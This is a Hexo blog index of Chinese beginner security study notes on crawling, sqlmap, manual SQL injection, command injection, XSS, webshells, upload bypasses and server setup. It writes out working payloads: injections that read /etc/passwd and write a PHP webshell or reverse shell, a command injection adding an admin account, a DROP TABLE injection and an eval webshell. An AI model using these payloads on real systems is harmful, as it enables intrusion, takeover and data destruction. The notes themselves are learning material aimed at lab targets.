[{"title":"简单爬虫","slug":"简单爬虫","date":"06-10","updated":"06-10","comments":true,"path":"2019/06/10/简单爬虫/","link":"","permalink":"http://148.70.147.195/index.html/2019/06/10/简单爬虫/","excerpt":"","text":"python–爬虫入门(建议python2 kali linux自带) 在这里安利一下廖雪峰老师，不管是mysql，python，什么的都讲的不错 python–商业爬虫 ######爬虫的强大作用在这里就不多言了，管他那么多，肝出来就完事了QAQ刚开始学爬虫这里先粘一张嘤嘤嘤的爬虫模板有这个参考入门会快很多 http: (1)当用户在地址输入了网址发送网络请求的过程 (2)请求方式get请求： 优点：比较便捷 缺点：不安全，参数长度有限制 post请求： 比较安全，数据整体没有限制，能上传文件 put（不完全的） delete（删除一些信息） head（请求头） 发送网络请求（需要带一定的数据给服务器） ↑放在请求头里 requestheader ![](https://s2.ax1x.com/2019/03/24/AY51VU.png) Accept：文本格式 Accept·Encoding：编码格式 connection：长连接，短链接 cooklie：缓存(服务器是别访问用户的唯一凭证) 服务器会返回数据：response header 爬虫入门：使用代码模拟用户批量发送网络请求批量获取数据 1爬虫的价值：1买卖数据（高端领域价格贵） 2数据分析 3流量 2合法性:灰色产业没有相关法律规定 公司概念：爬取数据库（窃取商业机密）！违法 3只能爬去用户能访问到的数据 4爬虫的分类：通用爬虫 使用搜索引擎搜索东西 优势：开放性好，速度快 劣势：目标不明确，返回内容很多用户不需要 聚焦爬虫（也就是接下来学习的） 优点：目标明确，清楚用户需求，返回内容固定 增量式：从第一页请求到最后一叶 Deep：深度爬虫：爬取静态数据：html，css 动态数据：js 加密js robots：是否允许其他爬虫（通用爬虫）爬去某些内容 聚焦爬虫不遵守robots 反爬虫：干掉用户 爬虫和反爬虫做斗争：资源对等情况下胜利者永远是爬虫 爬虫的工作原理： 1 确认抓取目标的url 2 使用python代码发送请求数据（java Go） 3 解析获取到的精准数据 4 数据持久化（保存） python3（原生提供的模块）：urlib.request python2 (原生提供的)：urlib2 5 request（第三方） 6 数据解析：xpath bs64 7 数据存储 GET 传参 尝试爬一下() 123456789101112131415161718192021222324252627282930#!/usr/bin/env python# -*- coding:utf-8 -*-# author: huahua time:2019/3/25import urllib.requestdef load_data(): url = &quot;http://www.baidu.com/&quot; # get请求 # http请求 # reponse:http响应对象 response = urllib.request.urlopen(url) print(response) # 读取内容 bytes类型 data = response.read() print(data) #将文件获取的内容转换成字符串 str_data = data.decode(&quot;utf-8&quot;) print(str_data) #将数据写入到文件 with open(&quot;baidu.html&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)as f: f.write(str_data) # 将字符串类型转换成bytes str_name = &quot;baidu&quot; bytes_name = str_name.encode(&quot;utf-8&quot;) print(bytes_name) #python 爬取的类型：str bytes #如果爬取的是bytes类型：但是你写入的时候需要字符串 decode(&quot;utf-8&quot;) #如果爬取的是str类型：但是你要写入的是bytes类型 encode（&quot;utf-8&quot;）load_data() 一些常用模块函数（学好英语–来自一个英语学渣的建议） （一）、URL parsing（URL解析） URL解析函数的重点是将URL字符串拆分为其组件，或将URL组件组合为URL字符串。 函数用于将一个URL解析成六个部分，返回一个元组，URL的格式为： 1scheme://netloc/path;parameters?query#fragment； 包含六个部分，元组中每一个元素都是一个字符串，可以为空，这六个部分均不能再被分割成更小的部分. 列表如下 元素 编号 值 值不存在时默认值 scheme 0 请求 一定存在 netloc 1 网址 空字符串 path 2 分层路径 空字符串 params 3 参数 空字符串 query 4 查询组件 空字符串 fragment 5 标识符 空字符串 username 用户名 None password 密码 None hostname 主机名 None port 端口号 None ·urllib.parse.urlparse()–解析成6个部分·urllib.parse.parse_qs()–返回一个key-value对应的字典格式 eg：{‘FuncNo’: [‘9009001’], ‘username’: [‘1’]}urllib.parse.urlunparse(）–将部分组装成url整体urllib.parse.urljoin(baseurl, allow_fragments=True)–将基本url和其他url组合成一个urlurllib.parse.urlencode(params)–将query中的查询值转换为一个URL编码的字符串,该字符串可以作为URL的query参数包括在内,或者可以上传作为POST请求的一部分。urllib.parse.urldefrag(url)–如果URL中包含fragment标识，就会返回一个不带fragment标识的URL，fragment标识会被当成一个分离的字符串返回；如果URL中不包含fragment标识，就会返回一个URL和一个空字符串；（二）、URL quoting（URL引用）这个模块的主要作用就是通过引入合适编码和特殊字符对URL进行安全重构，并且可以反向解析。“就是把中文什么的编成电脑认识的ascii码”urllib.parse.quote(string, safe=’string.printtable’, encoding=None, errors=None)第一个参数是URL，第二个参数是安全的字符串，即在加密的过程中，该类字符不变。默认为“/”；urllib.parse.quote_plus() 与上面的相似但是能把空格转成＋ safe默认为空urllib.parse.quote_from_bytes(bytes, safe=’/’)–接受字节urllib.parse.unquote()urllib.parse.urlencode(query, doseq=False, safe=”, encoding=None, errors=None, quote_via=quote_plus)–拼接map类型或两个序列元素的元组成为新的参数结果是key-value的形式 “字典传参” eg：key1=value1&amp;key2=value2… post： urllib.request.urlopen(url, data=None, [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)– url：就是url data：post请求 timeout：访问超时间 handler：处理器的自定义； headers 请求头：request=urllib.request.Request(url) user-agent 响应头：response=urllib.request.urlopen(url or request) 动态添加：request.addheader(“User-Agent”,”******“)(“注意首字母大写”) user-agent: (1)模拟真实的浏览器发送请求； （2）设置 request.addheader(“User-Agent”,”******“)(“注意首字母大写”) (3)响应头：response.header (4)创建request：urllib.request.Request(url) cookie：带着cookie请求模拟被认证的用户 cookiejar from http import cookiejar cookiejar.CookieJar() httpcookieprocessor() —有cookie功能的处理器能通过代码自动 IP代理 用不同的浏览器和ip地址 （1）免费的代理ip：时效性差，错误率高 （2）付费ip：错误率低，贵，也有时效 ip： 透明：对方知道真实ip 匿名：对方不知道真实ip，知道使用了代理 高匿：对反啥都不知道 但是python系统的urlopen没有添加代理的功能，需要我们手动写函数","categories":[],"tags":[]},{"title":"SQLmap注入","slug":"SQLmap注入","date":"06-10","updated":"06-10","comments":true,"path":"2019/06/10/SQLmap注入/","link":"","permalink":"http://148.70.147.195/index.html/2019/06/10/SQLmap注入/","excerpt":"","text":"SQLMAP自动注入 1 Get方法 ·sqlmap -u “http://192.168.253.129/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=password&amp;user-info-php-submit-button=View+Account+Details&quot; -p username -f ·扫描URL列表文件 ·http://1.1.1.1/vuln1.php？q=foobar http://1.1.1.1/vuln3/id/1* -d “mysql://user:password@192.168.20.10:3306/dvwa” -f –users –banner –dbs –schema -a ·sqlmap -m list.txt 扫描Google的搜索结果 SQLmap.py -g &quot;inurl:\\&quot;php?id=1\\&quot;&quot; 常用的一些参数 作用 -a all –banner 目标是什么版本，什么信息的数据库 –dbs 所有数据库 -f 指纹，足迹 –force-ssl 实现对HTTPS的sql注入 -h/-hh 展示/详细展示帮助 -m list.txt -p 手动测是要测试的参数 –schema 源数据库(定义数据的数据) –users 所有数据库用户 –version 版本信息 2 POST方法 ·使用http请求文件 sqlmap -r request.txt ·使用 burpsuit log文件 sqlmap -l log.txt ·HTTPS ·sqlmap -u “https://127.0.0.1/a.php?id=1:8080&quot;--force-ssl 3 request 方法·–user-agent –random.agent ·sqlmap检查user-agent中的注入点: level &gt;=3 ·APP/WAF/IPS/IDS/过滤异常user-agent时报错3.1 提交请求·Host 头 –host=”aaaaaaaaaa” –leval 5 –dbs host 头的注入漏洞只会存在于level 5（一般不常见） Refer 头：–refer ·level &gt;=3额外的header： –headers · 多个头提交。每个头单独一行用”\\”换行 (名称区分大小写) · sqlmap -u “http：//1.1.1.1/a.php?id=1” –headers=”host：Www.a.com\\nUser-Agent:yuanfh” ·method=GET/PPOST （不建议从高level检查”耗时且易发现”） -methord=GET/POST3.2 身份认证类型：Basic DIgest NTLMsqlmap -u “http**a.php?id=1”–auth-type Basic –auth-cred “user:pass”基于证书的认证–auth-cert（官方） / –auth-file (sqlmap -help)–auth-file=”ca.PEM”·含有私钥的PEM格式证书文件（仅支持）·PEM格式认证 ·Http（s）代理扫描时可能被服务器所发现，而被封。则可以用代理扫描·–proxy=”http：//127.0.0.1:8087”–proxy-cerd=”name:pass”–ignor-proxy (忽略系统级代理设置，常用于扫描本地网络目标)·sqlmap -u “http：//1.1.1.1/a.php?id=1”–proxy=”http：//127.0.0.1:8087”–dbs –delay·（延迟设置，减小被发现的几率）每次http（S）请求之间延迟时间，浮点数，单位为妙，默认无延迟–timeout·请求超时时间，浮点数，默认为30秒–retries超时重试次数 ，默认三次可以 参数 数值 or 参数=”数值“–randomize ·长度，类型与原始值保持一致的情况下，指定每次请求随机取值的参数名称 –scope ·过滤日志内容，通过正测表达式筛选扫描对象 ·sqlmap -l burp.log –sco=(www)?\\target\\.(com|net|org)” ·sqlmap -l 2.log –scope=”(19)?\\.168\\.20\\.(1|10|100)”level 3 –dbs –safe-url / –safe-freq ·检测和盲注阶段会产生大量失败请求，服务器段可能因此销毁session ·每发送–safe-freq次注入请求后发送一次正常请求 –skip-urlncode ·默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据 –eval 每次请求 执行指定的python代码 每次请求更改或者增加新的参数值（时间依赖，其他参数值依赖） sqlmap -u “http：//1.1.1.1/a.php?id=1&amp;hash=密文密码”–eval=“import hashlib;hash=hashlib.md5(id).hexdigest()” 4 OPTIMIAZATION 优化性能 –predict-output ·根据检方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率 ·版本名，用户名，密码，Privilieges，role,数据库名称，表名，列名 ·与threads参数不兼容 ·统计表：/user/share/sqlmap/txt/common-outputs。txt –keep-alive ·使用http（s）长连接，性能好 ·与proxy参数不兼容 ·长连接避免你重复建立连接的网络开销，但大量长连接会占用服务器资源 –null-connection · 只获取相应页面大小值而非页面具体内容 ·通常只用于盲注判断（真假），降低网络带宽消耗 ·与–text-only参数不兼容（基于页面内容比较判断 真/假） –threads ·最大并发线程 ·盲注时每个线程获取一个字符（7次请求），获取完成后线程结束 ·默认值为1，建议不要超过10 ，否则可能影响站点可用性 ·与 –predict-output参数不兼容 -o 开启前三个性能参数（除–threads参数）","categories":[],"tags":[]},{"title":"SQL手动注入初步","slug":"SQL手动注入初步","date":"06-10","updated":"06-10","comments":true,"path":"2019/06/10/SQL手动注入初步/","link":"","permalink":"http://148.70.147.195/index.html/2019/06/10/SQL手动注入初步/","excerpt":"","text":"手动漏洞挖掘-sql注入服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器 用户登录判断·SELECTFROM users WHERE user= ‘uname ‘ AND password=’pass’·SELECTFROM users WHERE user=’name’ AND password=’’ OR ‘’=’’·基于报错的检测方法· ‘ % （）·基于布尔的检测方法1 ‘ and ‘1 ‘= ‘1 / 1 ‘ and ‘11 ‘and ‘1 ‘= ‘2 / 1 ‘and ‘0判断查询字段并搞清楚位置表列数 ‘order by 9– #按查询列号排序· select + 时刻字段数=查询字段数· 联合查询（多条查询语句同时执行）· ‘union select 1.2–· ·union all select database().2–DB用户 ： user（）DB版本 ; version()‘union select databnase() , substring_index(user(),”@”,1)#（把查询函数切分）全局函数 ： @@datadir（当前数据库所在位置），@@hostname（主机名）,@@VERSION，@@VERSION_compile_os （操作系统版本）当前库： database()·ASCLL转字符：char() 分隔链接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())计算哈希：md5() Mysql 数据结构·information_schema·所有库所有表/统计每库中表的数量union select table_name,table_schema,from information_schema.tables#（查所有表）UNION select table schema.count() FROM information_Schema.tables group by table_schema#（查表名） Dvwa库中的表名·union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’#(按表名查询) 查询user,password 列的内容·union select user,password from dvwa.users#·union select user,password from users#·union select null,CONCAT(user(),0x3a,password) from users# 破解MD5username:passhas——–&gt;hashtestjohn –format=raw-MD5 hashtest –shousqlmap -d “mysql://root:@192.168.177.129:3306/dvwa” -a 读写文件和下载数据库读取文件‘union select null,LOAD_file(‘/etc/passwd’)# 写入文件 ‘union select null,”&lt;?php passthtu $_ GET[‘cmd’]);?&gt;”INTO DUMPFILE”/var/www/a.php可能会出发过滤机制用16进制编码kali实操拷贝一个反弹shellcp /usr/share/webshell/php/ →reverse-shell.php/b.phpvi b.php 把ip改成目标ip 对b.php编码cat b.php | xxd &lt;–(16进制编码) -ps（会以固定长度编译，换行符mysql无法理解）用| tr -d ‘\\n’复制下编码内容注入到语句中去（0x编码内容）·Mysql账号cat php-revers-shell.php|xxd -ps | tr -d ‘\\n’(反弹shell) 保存下载数据库union select null,(0x3a,password) from users INTO OUTFILE’/tmp/a.db’#(脱库到目标服务器的本地目录，在通过url下载) 一个思路：编写服务器代码举个例子：（上传的webshell收到限制没什么用）变换一个思路了解目标服务器结构等等，直接写一段代码执行命令如上图可以创建一个表单添加一个用户现在的加密破解难度极大，效率低，可以变通思路，直接更改数据库内容，或添加高权限管理员 ps 建议在kali装上professional的burp suite 当无权读取information_schema库 / 拒绝union、order by语句时 猜列名： ‘ and column is mull# ·Burpsuite 自动猜列名 猜当前表表名： ‘and table.user is null# 猜库里其他表名： ‘and (select*from table)&gt;0# 列表对应关系：’and users.user is null# 猜字段关系： ‘or user=’admin&apos;or user like &apos;%a% 猜账号对应密码：’or user=’admin’ and password=’密码当数据可写 · ‘:updat user set user=’yuanfh’ where user=’admin“;”可以并列多条数据库语句· INSERT INTO users（’user_id’,’first name’,’last_name’,’）user’,’password’,’avatar)VALUES(‘35’,’fh’,’yuan’,’密码’,’OK’);#‘;DROP TABLE users；#xp_cmdshell/ 储存过程·SQLi没有通用的方法，要领就是掌握原理，了解各种数据库特性 sql注入-DVWAmedium难度级别和high难度区分上面两张图就是medium和low的区别mysql_real_escape_string()”在php5.5弃用”在php7.0删除此语句，代之以MysqlLi，PDO_MySQlmedium在low的基础上增加了一句过滤语句，是PHP的集成语句，能实现特殊字符的转译 “\\,’,”,\\n,\\r,\\xla”下面看一下high改动的代码一个数字检查就无法注入select语句了 sql 盲注不显示数据库内建的报错信息 ·内建的报错信息帮助开发人员发现和修复问题 ·报错信息提供关于系统的大量有用信息当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果即盲注 思路：既然无法基于报错信息报错信息判断结果，基于逻辑真假的不同结果来判断· 1’and 1=1#· 1’and 1=2#猜列名 ： 1’and table.user is not null#猜库里其他表：1’and (select count() from table)&gt;0#列对应关系 1’and users.user is not null#猜字段内容：1’and user=’admin 1’or user like ‘%a%·猜账号对应密码： ·2’ or user=’admin’and password=’密码 ·burpsuit自动化猜解 ·打开脑洞，注入的方式多种多样真实案例：某电商网站 http://1.1.1.1/goods.php?cnt&amp;goodsid=123·and 1=1# 显示一包面巾纸·and 1=2# 显示一包洗衣粉工具未扫到漏洞，于是人工拼接了下列语句——————————————————————————————↓截取第一个字符 · 1’and ORD(MID((version()),1,1))&amp;1&gt;0# 得到ASCLL码↑↑从字符串截取\\↑查询版本信息· CURRENT_USER()、DATABASE()· MID(ColumName,Start[,Length])·ORD(string)&amp;32 跟上的对应的字符的ascll码的32所在的位的值1(128) 1(64) 1(32) 1(16) 1(8) 1(4) 1(2) 1(1)依次查询就可以的到对应的ascll码进而得到所有信息. SQLMAP自动注入 简介 ·开源sql注入漏洞检测，利用工具 ·检测动态页面中get/past参数、cookie、http头 ·数据榨取 ·文件系统访问 ·操作系统命令执行 ·引擎强大、特性丰富 ·Xss漏洞检测 五种漏洞检测技术 基于布尔的盲注检测。(详见手动注入) 基于时间的盲注检测。· ‘and (select*from(select(sleep(20)))a)#↑等待20s再执行 基于错误的检测 基于UNION的联合查询检测 ·适用于通过for循环直接输出联合查询结果，否则只显示第一项结果 基于堆叠的查询检测·通过；堆叠多个查询语句·适用于非slect的数据修改，删除操作· 支持的数据库管理系统DBMS·MySWQL，Oracle，PostgerSQL，Microft SQL，Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB. 其他特性 ·数据库直连 -d ·不通过SQL注入，指定身份认证信息，ip，端口 ·与Burp suit，Google 结合使用，支持政策表达式限定测试目标 ·Get，past，cookie，referer，User-Agent（随机或指定） ·cookie过期后自动处理Set-Cookie头，更新cookie信息 ·限速：最大开发 延迟发送 ·支持Basic，Digest，NTLM，CA身份认证 ·数据库版本，用户权限hash枚举和字典破解，暴力破解表列名称 ·文件上传下载，UDF，启动并执行储存过程，操作系统命令执行，访问windows注册表 ·与w3af，metaspolit集成结合使用，基于数据库服务进程提权和上传执行后门","categories":[],"tags":[]},{"title":"安全入门5","slug":"安全入门5","date":"06-10","updated":"06-10","comments":true,"path":"2019/06/10/安全入门5/","link":"","permalink":"http://148.70.147.195/index.html/2019/06/10/安全入门5/","excerpt":"","text":"综合场景渗透与渗透测试流程 入门篇的渗透工具和渗透方式大概就介绍完了，今天介绍一下综合的流程思路什么的后面应该就会开展专题的渗透学习了还是说一下什么是渗透测试：“从攻击者的角度审核网络系统安全过程 使用黑客手段发现系统漏洞帮助系统管理员知道面临的威胁，以便采取必要的防范措施”目的是为了发现漏洞，数据泄漏获取权限以及更深入的目标，学安全学的第一句话就是(人品第一，技术第二)就不要想着去干坏事啊。 发现漏洞： 手工测试 漏洞扫描 利用漏洞： 获取数据 获得权限（权限）主要对象-目标信息系统组成操作系统：WINDOWS，SOLARIS，AIX，LINUX，CSO，SGI等操作系统网络结构：路由器，交换机和防火墙等设备组成的网络结构应用系统：web应用，数据库，FTP等数据类容：数据库，敏感文件类容 渗透方式 3.1 前期交互方案制定,确认渗透测试目标梳理思路 3.2 信息搜集：根据搜集到的信息，分析系统脆弱性，制定攻击模型，清理共攻击思路 信息搜集 目标：web应用信息，操作系统与服务 网络结构 ·web 服务器网络信息 ·web服务器c段 ·web服务器防护情况 ·web应用程序信息 ·web应用中间件 ·web应用使用的框架模板 ·web应用路径信息 ·web应用的敏感文件 ·web应用使用的第三方插件 ·web应用程序域名信息： ·whois注册信息 ·web应用程序子域名 ·nx记录 mx记录 ·web应用程序其他信息 ·网站客服信息（qq，邮箱，电话） ·网站所属公司信息 ·网站员工敏感信息 ·公众号，app ·web应用程序信息 中间件信息 ·判断网站是否采用了框架搭建？ 3.3 漏洞发现：根据上一步建立威胁模型，展开漏洞测试 漏洞利用（不同的目标与路线对应不同的方向）：或去数据-SQL注入，敏感信息泄露获得权限-上传命令注入等 权限提升获取web服务器最高权限，获取域控制权 提权与密码破解 ·第三方组建提权 ·文件系统权限配置不当 pr提权的漏洞全称是Microsoft Windows RPCSS服务隔离本地权限提升漏洞。微软发布的漏洞公告是MS09-012（KB952004），对应的CVE-2009-0079 mimikatz 可以直接获取到windows平台下的明文密码，相比于其他工具最大的特点是速度极快 原理是从lsall。exe进程中直接获取密码进行破解，而且破解方式不是穷举而是反向计算·脏牛提权 Linux 内核的内存子系统在处理写入时复制（copy-on-write,cow）时产生了竞争条件（race condition）。 mysql udf提权 ·MD5破解：stfw 总结与报告输出：总结漏洞情况，发现漏洞的详细过程，漏洞修补方案； 至此web入门就大概这样了，对渗透有了一些初步认识，接下来就是专题的学习了留一个空连接","categories":[],"tags":[]},{"title":"安全入门4","slug":"安全入门4","date":"06-10","updated":"06-10","comments":true,"path":"2019/06/10/安全入门4/","link":"","permalink":"http://148.70.147.195/index.html/2019/06/10/安全入门4/","excerpt":"","text":"很常见的漏洞xss漏洞（跨站脚本攻击）由于浏览器工作机制差不多：解析渲染web中间件响应的html语言等所以xss使用范围极广服务器与网站建立的联系是一次性的，为了让浏览器再次访问是能被服务器‘认出来’，服务器就会给浏览器发一个cookie(本地保存的密码实际上就是保存cookie)作为辨认标识，也是识别身份的唯一凭证可以通过在地址栏输入javascript:(document.cookie)查询。危害很大·窃取cookie ·DDoS攻击 ·网页挂马 ·提升用户权限 ·获取客户端信息 ·传播跨站脚本蠕虫 ·劫持用户会话·强制弹出广告页面 ·任意窜改页面信息xss攻击一般分为三种 反射型xss 一次性攻击 存储型xss 如果服务器打开新的网的时候调用了含有恶意js脚本的网站所有访问的浏览器都会执行 DOM型特殊类型的反射型xss，但不需要和服务器进行交互 xss漏洞发现和利用反射性xss可以在源码查看关键变量eg： alart(“我的人生没有故事只有一个帅字贯穿始终”)或者&lt;img src=0 onerrow alart(‘xss’)&gt;提交则会弹窗储存型xss和反射型差不多不过会长期保存Dom不太明白就不多说了 xss自动化测试常见 ·awvs ·appscan ·w3af ·xsser ·xssf如果发现了xss漏洞，那么我们可以结合一些xss工具来利用。常见的css利用工具有下面几个·BlueLotus——XSSReceiver搭建的XSS平台·XSSer.me源代码搭建的XSS平台·kali下的BeEf CSrf（跨站请求伪造）！csrf 常与xss混合使用原理：web应用程序在用户进行敏感操作时，如修改账号密码，添加账号，转账等，没有校验表单token或者http请求头中的referer值，被恶意利用完成恶意请求 目录遍历漏洞目录遍历漏洞是应为Web中间件与网站目录权限配置不当。在网站目录无索引文件（index.html,index.asp,index.php,index.jsp）的情况下访问改网站会直接显示该目录下所有文件及其子目录。通过web中间件进行正确的配置，可以由效避免这些漏洞。可以手工测试，也可以用自动化扫描器（awvs，w3af，APPscan）可以得到很多信息 信息泄露漏洞，任意文件读取漏洞（简单介绍一下）信息泄露web服务器敏感信息泄露端口 ：服务类型 开放服务版本。中间件敏感信息泄露 ：中间件类型 版本 后台地址。web应用程序信息泄露。web应用程序脚本程序版本。web应用程序开发框架。web应用程序cms类型。web应用程序后台地址 敏感目录 api等。安装目录信息。开发遗留文件。第三方插件。的whois信息。 防御方式：修改默认端口 屏蔽安装的服务的版本信息，修改对web中间件默认的后台地址 任意文件读取配置不当且没有对用户下载的文件参数进行有效的过滤，恶意用户就可以获取任意文件如web数据库的账号密码等。如果网站提供的链接形如：·readfile.php?file= .txt·download.php?file= .rar或者参数名为：·realPath=·filePath=·inputfile=则多半是可利用的目录遍历漏洞尝试下载网站的索引文件index文件，下载文件本身，下载爬虫都可以利用。","categories":[],"tags":[]},{"title":"安全入门3","slug":"安全入门3","date":"06-10","updated":"06-10","comments":true,"path":"2019/06/10/安全入门3/","link":"","permalink":"http://148.70.147.195/index.html/2019/06/10/安全入门3/","excerpt":"","text":"简单的sql注入原理都和其他渗透方式差不多，都是未将用户提供的参数和查询代码隔离。常见几种注入方式：整形注入；字符型注入；基于错误显示的sql注入；union型sql注入；布尔型注入；基于时间的sql注入web后端数据库一般有Mysql，SQLServer，Oracle，Access， 因为没有细致的展开去学，这里也不过多介绍，后面学了会补上博客连接注入的基本思路：·判断是否为动态网站，注入点仅存于动态网站；·判断是否有注入点·手工或者通过工具查看数据库信息·获取敏感信息，密码等 常见手工注入语句：‘ and ’1‘=’1 ；‘ and ’1‘=’2查询列数的语句： order by n （超出列数会执行错误）union(联合查询可以和多条select语句共同起作用)判断数据显示点 union select 1，2，3，N查看数据库基本信息version（），database（）查看数据库有哪些表union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’查看对应表有那些列union select 1,2,group_contacat(column_name)from information_schema.clumns where table_name= ‘users’查看账号密码信息union select 1,group_concat(username),group_concat(password) from users最常用的工具就是SQL map了，上手也快功能强大进阶版 命令注入漏洞有些网站可以提ping功能，但是如果缺少一些过滤保护，那么就能通过一些特殊的指令让其执行恶意命令命令的权限取决于web中间件的权限举个简单的例子 ping 127.0.0.1 &amp;&amp; net user admin password /add就可以通过命令添加一个新的admin管理员常见下面的命令： ·for windows ping 测试网络连通性 netstart 查看网络端口及连接状态 net user 查看增加删除当前系统账号 net localgroup 查看增加删除当前系统账号 net localgroup 查看增加删除当前系统用户组 dir 当前目录下的文件和子目录信息 req 注册表及相关操作 systeminfo 查看当前计算机的综合信息 tasklist 显示当前运行的进程信息 ·多条语句执行语法格式语句1 &amp; 语句2 : 执行1后执行2语句1 &amp;&amp; 语句2 : 执行1成功后执行2语句1 &#124;&#124;语句2 : 执行1失败后执行2语句1 &#124;语句2 : 把1的执行结果传递给2 ·for linux ifconfig 查看当前ip，mac等信息 netstat 查看网络开放端口及连接状态 whoiam 查看当前用户 cat /etc/passwd 查看所有用户信息 ls 查看当前目录下的文件和子目录信息 useradd 添加账户 userdel 删除账户 passwd 修改账户密码 命令注入一般流程","categories":[],"tags":[]},{"title":"安全入门2","slug":"安全入门2","date":"06-10","updated":"06-10","comments":true,"path":"2019/06/10/安全入门2/","link":"","permalink":"http://148.70.147.195/index.html/2019/06/10/安全入门2/","excerpt":"","text":"web威胁概述OWASP top-ten： open web application security project开放式web应用程序安全项目 ####Webshell(就是木马后门（php，jsp等）) 一句话木马：代码简单，通过webshell工具可以实现强大的功能php： eval 函数前一天有讲到http的get 和post 的请求方式这里$_POST php超全局变量$_GET和$_POST用于收集表单数据（from-data）eg：eval ($_POST[‘cmd’]);其他webshell 大马不需要菜刀等工具本身有各种类型的集成代码 文件上传漏洞直接上传webshell控制服务器原理 未将web应用程序与用户提交文件隔离上传流程：前端校验 http传输 web应用程序校验 web应用储存 web应用解析运行任意文件上传漏洞：开发人员测试代码没删除，上传文件经过压缩编码 ，通过特定的客户端上传，如app逃过js校验上传绕过方法 ：修改前端JS代码 、改包后i段上传校验绕过一般校验字段绕过扩展名的校验绕过黑名单PHP php5,php6,php加空格，phtml，PhP（大小写混合）ASP：aspx，cer，cdx，aSp（大小写混合）JSp：jspx,jspfJsP(大小写混合) 绕过头文件校验文件上传漏洞00截断在上传文件时web在某些版本下遇到\\x00字符后会截断路径名，测试人员通过构造韩、x00的特殊文件名就可以通过上传文件名的扩展名校验，但在保存时却以非法扩展名保存文件例如test.php\\x00.jpg 解析漏洞","categories":[],"tags":[]},{"title":"安全入门","slug":"安全入门","date":"06-10","updated":"06-10","comments":true,"path":"2019/06/10/安全入门/","link":"","permalink":"http://148.70.147.195/index.html/2019/06/10/安全入门/","excerpt":"","text":"web入门第一天HTTP之请求方法请求： GET HEAD POSTHTTP之响应消息Response;一般情况有4部分1.状态行 2消息报头3.空行 4.响应正文提交请求后会收到返还的状态码：1xx:指示信息–请求已接收，继续处理 ；2xx:成功–接收、理解、接受 ；3xx：重定向–要完成请求必须更进一步操作；4xx:客户端错误–请求有语法错误or无法实现请求；5xx：服务器错误–服务器未能实现合法请求。 渗透测试一般在虚拟机上环境下比较方便（百度上有各种各样的教程这里就不过多赘述了）kali的账户默认为root 密码默认为toor然后讲一讲安装好后的配置问题：VMware 提供了三种网络工作模式 （解决虚拟机网络联通的问题）·Bridged 桥接模式：虚拟机和实体机在同一网段IP相同·NAT 网络地址转换模式：虚拟机通过实体机来上网·Host_Only 仅主机模式：只能和实体机通讯无法上网VMware workstation 还提供了虚拟机快照的功能“位于顶部文件那一栏”对虚拟机的运行状态进行快照，（包括正在安装的软件，和进程）以便恢复之前的状态。（建议在第一次配置好后拍一张快照储存当初始化用） 然后来讲一下网站的搭建网站由中间件、网站程序、数据库等程序组成。常见的中间件大致就是Apache、Ninx、IIS这三种然后由 PHP、JSP、ASP等web语言编写，数据库则mysql是目前最火的数据库我们搭建网站时可以独立安装每一个组建，也有一键建站的集成功能。当然，各有好处常见的集成环境：·phpStudy ·XAMPP ·Wamp ServerDVWA时开源的漏洞靶场功能强大，学习适合可以参照百度上的教程也可以安装虚拟机靶场Metasploitable2-Linux 账号密码都为msfadmin 登录后ifxonfig出ip 在浏览器输入ip就可以使用了DVWA的账户默认为admin 密码是password。 ###Burpsuit基础burpsuit是用于攻击web的集成平台。包含许多工具所有工具都共享一个能处理并显示HTTP消息，持久性，认证，代理日志警报的一个强大的可扩展框架所有功能的核心都是HTTP代理对HTTP流量分析方便挖掘web漏洞顺便体一句HTTP代理：HTTP代理位于浏览器和web服务器之间可以分析浏览器和服务器之间的通信数据 ，测试web漏洞如SQl注入，文件上传，弱口令等","categories":[],"tags":[]},{"title":"hexo博客在自己服务器上的搭建","slug":"hexo博客在自己服务器上的搭建","date":"03-31","updated":"04-01","comments":true,"path":"2019/03/31/hexo博客在自己服务器上的搭建/","link":"","permalink":"http://148.70.147.195/index.html/2019/03/31/hexo博客在自己服务器上的搭建/","excerpt":"","text":"在学长的推荐下准备弄一个自己的服务器，又没有想好搭建一个什么网站，于是准备把之前准备好的github上的博客部署到我自己的服务器上。 刚开始的时候我听信了，网上教程的鬼话“ubuntu更适合做服务器”，在经历了10个小时的学习，调试，配置环境等成功不了的以及让人心态爆炸的操作，和重装6次服务器系统之后，我选择换成了”CentOS 7.5 64位”的服务器。这里就讲一下怎么样快捷的部署自己的博客 准备工具 git环境 一个云服务器（这里以腾讯云为例） 一台能上网的电脑 第一得先学会在本地搭建git博客（当然其他的也行），不会的可以去下面的连接看看大多数人用这个应该都能弄好吧 然后开始进入安装正题 1. 首先装好你的系统，这里为了做一遍教程，我先把我的系统重装了同时进入宝塔linux注册一个账号然后点立即安装跳转到下一页面然后能看到这里有三个开端口的教程,照着他做，没什么难的！腾讯云开端口教程注意一下这里提示也可以导入······实则是必须导入两个文件，下载下来导入就好了 然后我们回到腾讯云的控制台找到镜像，然后点击导入镜像 url填写服务器ip 名称随意然后保持默认就好了 然后需要打开服务器进行操作了这里我选择的连接工具是FinalShell_forwindowsformacos安装好后按图示登陆连接你的服务器然后就可以进入你的服务器命令行界面。输入下面命令进行安装1yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh 遇到提示一律输入y就可以了安装好以后重启一遍在服务器输入下面这行代码1/etc/init.d/bt start 然后用服务器给你的账号与密码登陆服务器给你的url然后选择一件安装左边的板块，接下来就是漫长的读条时间 安装完成后点击网站–添加站点 如果购买了域名且解析了的话这里就填你的域名，没有的话就填写服务器IP就可以了（其他默认）此时你的服务器最下面会有一个www目录打开里面的wwwroot目录就会有你的域名目录打开你的blog根目录有一个public文件夹，每次要上传的时候把里面的所有内容全部拖到域名目录里就可以访问了ps:如果喜欢ubuntu的话把yum换成apt试试（没测试过） 分割线 